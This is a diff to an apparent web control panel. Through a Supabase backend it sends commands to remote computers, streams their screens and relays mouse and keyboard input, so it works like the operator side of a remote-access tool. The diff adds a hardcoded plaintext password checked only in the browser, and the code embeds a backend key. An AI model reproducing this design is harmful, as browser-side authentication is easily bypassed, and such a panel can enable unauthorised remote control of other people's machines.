@@ -36,9 +36,27 @@ body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-heig
 .ctrl-bar{display:flex;gap:.5rem;margin-bottom:1rem;flex-wrap:wrap;align-items:center}
 .ctrl-bar .sep{color:#30363d;margin:0 .3rem}
 .err{color:#f85149;font-size:.85rem;padding:.5rem;background:#161b22;border:1px solid #da3633;border-radius:6px;margin-bottom:.5rem}
+
+/* Lock screen */
+.lockscreen{position:fixed;top:0;left:0;width:100%;height:100%;background:#0d1117;display:flex;align-items:center;justify-content:center;z-index:999}
+.lockbox{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:2rem;text-align:center;max-width:360px;width:90%}
+.lockbox h2{color:#58a6ff;margin-bottom:1.5rem;font-size:1.2rem}
+.lockbox input{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.7rem;color:#c9d1d9;font-size:1rem;text-align:center;margin-bottom:1rem}
+.lockbox input:focus{outline:none;border-color:#58a6ff}
+.lockbox .err{color:#f85149;font-size:.85rem;margin-top:.5rem}
+.lockbox .btn{width:100%;padding:.7rem;font-size:1rem}
 </style>
 </head>
 <body>
+<div class="lockscreen" id="lockscreen">
+  <div class="lockbox">
+    <h2>Enter Password</h2>
+    <input type="password" id="pwinput" placeholder="Password" onkeydown="if(event.key==='Enter')checkPw()" autofocus>
+    <button class="btn btn-green" onclick="checkPw()">Unlock</button>
+    <div class="err" id="pwerr"></div>
+  </div>
+</div>
+<div id="app" style="display:none">
 <div class="topbar">
   <a class="back" href="index.html">&larr;</a>
   <h1 id="name">-</h1>
@@ -72,10 +90,11 @@ body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-heig
       <span id="screenFps" style="color:#8b949e;font-size:.8rem;margin-left:auto"></span>
     </div>
     <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
-    <div id="screenErr" class="err" style="display:none"></div>
   </div>
 </div>
+</div>
 <script>
+const PASS='kaanbanaan';
 const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
 const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
 const H={headers:{apikey:KEY,Authorization:'Bearer '+KEY}};
@@ -91,20 +110,20 @@ let mouseThrottle=0;
 let frameCount=0;
 let fpsTime=0;
 
+if(sessionStorage.getItem('auth')!==PASS){
+ window.location='index.html';
+}
+
 document.getElementById('name').textContent=computer||'Unknown';
 document.title=computer||'Client';
-
-function showErr(id,msg){
- const el=document.getElementById(id);
- if(msg){el.textContent=msg;el.style.display='block';}else{el.style.display='none';}
-}
 
 (async()=>{
  try{
   const r=await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(computer)+'&order=id.desc&limit=1',H);
+  if(!r.ok)return;
   const p=await r.json();
   if(p.length)document.getElementById('meta').textContent='IP: '+(p[0].ip||'?')+' | Last: '+new Date(p[0].created_at).toLocaleString();
- }catch(e){document.getElementById('meta').textContent='Error loading info';}
+ }catch{}
 })();
 
 function switchTab(el,name){
@@ -115,14 +134,15 @@ function switchTab(el,name){
 }
 
 async function sendAndWait(type,payload,el,errId){
- showErr(errId,'');
+ const errEl=document.getElementById(errId);
+ if(errEl)errEl.style.display='none';
  el.innerHTML='<div class="loading">Sending...</div>';
  try{
   const r=await fetch(SB+'/rest/v1/commands',{method:'POST',headers:PH,body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
-  if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';showErr(errId,'Server returned '+r.status);return null;}
+  if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(errEl){errEl.textContent='Server returned '+r.status;errEl.style.display='block';}return null;}
   const rows=await r.json();
   const cmdId=rows&&rows.length?rows[0].id:0;
-  if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';showErr(errId,'No command ID returned');return null;}
+  if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';if(errEl){errEl.textContent='No command ID returned';errEl.style.display='block';}return null;}
   el.innerHTML='<div class="loading">Waiting for response...</div>';
   for(let i=0;i<60;i++){
    await new Promise(r=>setTimeout(r,1000));
@@ -131,15 +151,15 @@ async function sendAndWait(type,payload,el,errId){
     if(!r.ok)continue;
     const rows=await r.json();
     if(rows.length&&rows[0].status==='done'){
-     if(rows[0].result==='exec_err')showErr(errId,'Execution error on client');
+     if(rows[0].result==='exec_err'&&errEl){errEl.textContent='Execution error on client';errEl.style.display='block';}
      return rows[0];
     }
    }catch{}
   }
   el.innerHTML='<div class="loading">Timeout - no response</div>';
-  showErr(errId,'Client did not respond within 60s');
+  if(errEl){errEl.textContent='Client did not respond within 60s';errEl.style.display='block';}
   return null;
- }catch(e){el.innerHTML='<div class="loading">Error: '+(e.message||'unknown')+'</div>';showErr(errId,e.message);return null;}
+ }catch(e){el.innerHTML='<div class="loading">Error</div>';if(errEl){errEl.textContent=e.message||'unknown';errEl.style.display='block';}return null;}
 }
 
 async function runCmd(){
@@ -169,21 +189,20 @@ async function takeScreenshot(){
 async function startScreen(){
  document.getElementById('screenStartBtn').style.display='none';
  document.getElementById('screenStopBtn').style.display='';
- showErr('screenErr','');
- screenInterval=setInterval(pollScreen,500);
+ screenInterval=setInterval(pollScreen,800);
  frameCount=0;
  fpsTime=Date.now();
 }
 
 async function pollScreen(){
- const el=document.getElementById('screenResult');
  try{
-  const r=await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screen&status=eq.done&order=id.desc&limit=1',H);
+  const r=await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screen_live&status=eq.done&order=id.desc&limit=1',H);
   if(!r.ok)return;
   const rows=await r.json();
   if(rows.length&&rows[0].result){
    const t=new Date(rows[0].created_at).getTime();
-   if(Date.now()-t<15000){
+   if(Date.now()-t<30000){
+    const el=document.getElementById('screenResult');
     const imgSrc='data:image/jpeg;base64,'+rows[0].result;
     if(el.querySelector('img')){
      el.querySelector('img').src=imgSrc;
@@ -198,11 +217,13 @@ async function pollScreen(){
      frameCount=0;
      fpsTime=Date.now();
     }
-   }else if(pollLastTime&&Date.now()-pollLastTime>10000){
+   }else if(pollLastTime&&Date.now()-pollLastTime>15000){
+    const el=document.getElementById('screenResult');
     if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
     document.getElementById('screenFps').textContent='';
    }
-  }else if(pollLastTime&&Date.now()-pollLastTime>10000){
+  }else if(pollLastTime&&Date.now()-pollLastTime>15000){
+   const el=document.getElementById('screenResult');
    if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
    document.getElementById('screenFps').textContent='';
   }
@@ -246,8 +267,8 @@ function toggleMouse(){
  const btn=document.getElementById('mouseBtn');
  btn.textContent=mouseOn?'Mouse ON':'Mouse OFF';
  btn.classList.toggle('active-toggle',mouseOn);
- if(mouseOn&&document.getElementById('screenCanvas')){
-  const c=document.getElementById('screenCanvas');
+ const c=document.getElementById('screenCanvas');
+ if(mouseOn&&c){
   c.style.cursor='crosshair';
   c.onmousedown=function(e){
    if(!mouseOn)return;
@@ -301,8 +322,7 @@ function stopScreen(){
  document.getElementById('screenStartBtn').style.display='';
  document.getElementById('screenStopBtn').style.display='none';
  document.getElementById('screenFps').textContent='';
- const el=document.getElementById('screenResult');
- el.innerHTML='<div class="loading">Stopped</div>';
+ document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';
  if(mouseOn)toggleMouse();
  if(keyOn)toggleKeyboard();
 }
